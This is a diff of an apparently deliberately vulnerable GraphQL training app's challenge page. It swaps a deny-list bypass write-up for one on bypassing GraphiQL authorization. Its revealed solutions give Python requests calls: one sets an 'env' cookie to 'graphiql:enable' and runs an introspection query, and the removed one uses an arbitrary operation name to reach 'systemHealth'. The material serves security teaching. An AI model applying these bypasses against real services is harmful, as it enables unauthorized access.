@@ -1,52 +1,32 @@
 <!-- Start -->
-<h3 style="color:purple" id="bypassauthz-denylist"><b>GraphQL Query Deny List Bypass</b></h3>
+<h3 style="color:purple" id="bypassauthz-igql"><b>Authorization Bypass :: GraphQL Interface Protection Bypass</b></h3>
 <hr />
 <h5>Problem Statement</h5>
 <p>
-  Creating an <b>allow-list</b> or <b>deny-list</b> for GraphQL is a common technique to prevent malicious queries from
-  being resolved by GraphQL.
-</p>
-<ul>
-  <li>
-    By defining an <b>allow-list</b>, the application server will have a "known good" queries it will allow, and
-    reject anything else.
-  </li>
-  <li>
-    By defining a <b>deny-list</b>, the application server will have a "known bad" queries it will reject, and allow
-    anything else.
-  </li>
-</ul>
-<p>
-  In general, the allow-list approach is easier to maintain and less error-prone, since we only allow certain things we
-  trust. It does not mean it cannot have flaws too.
-</p>
-<p>
-  The application has a deny-list mechanism implemented that attempts to reject Health queries using the
-  <code>systemHealth</code> query.
-</p>
-<p>
-  The problem with this mechanism is that it does not take into consideration queries can have <a href="https://graphql.org/learn/queries/#operation-name" target="_blank">operation names</a>.
+  GraphiQL is available at the path <code>/graphiql</code> with a poorly implemented authorization check.
 </p>
 <h5>Resources</h5>
 <ul>
   <li>
-    <a href="https://www.apollographql.com/blog/securing-your-graphql-api-from-malicious-queries-16130a324a6b/" target="_blank">
-      <i class="fa fa-newspaper"></i> Apollo - Securing your GraphQL From Malicious Queries
-    </a>
-  </li>
-  <li>
-    <a href="https://cwe.mitre.org/data/definitions/184.html" target="_blank">
-      <i class="fa fa-newspaper"></i> CWE-184: Incomplete List of Disallowed Inputs
+    <a href="https://cwe.mitre.org/data/definitions/639.html" target="_blank">
+      <i class="fa fa-newspaper"></i> CWE-639 - Authorization Bypass Through User-Controlled Key
     </a>
   </li>
 </ul>
-<h5>Exploitation Solution <button class="reveal" onclick="reveal('sol-brokenauthz-denylist')">Show</button></h5>
-<div id="sol-brokenauthz-denylist" style="display:none">
+<h5>Exploitation Solution <button class="reveal" onclick="reveal('sol-brokenauthz-igql')">Show</button></h5>
+<div id="sol-brokenauthz-igql" style="display:none">
   <pre class="bash">
+# Beginner mode
+
+# Cookie 'env' stores a string with an instruction to disable graphiql. altering the value to contain graphiql:enable will bypass the protection
+
+# Alter the env cookie to change "graphiql:disable" to "graphiql:enable" to bypass this check:
+requests.post('http://host/graphiql',
+  json={"query":"query IntrospectionQuery{__schema {queryType { name } mutationType { name } subscriptionType { name }}}"},
+  cookies={'env':'graphiql:enable'}
+)
+
 # Expert mode
-
-# Query systemHealth directly by calling /graphql and supplying an arbitrary operation name.
-
-requests.post('http://host/graphql', json={"query":"query BypassMe{systemHealth}"}, headers={'X-DVGA-MODE':'Expert'})</pre>
+# GraphiQL interface is disabled.</pre>
 </div>
 <!-- End -->
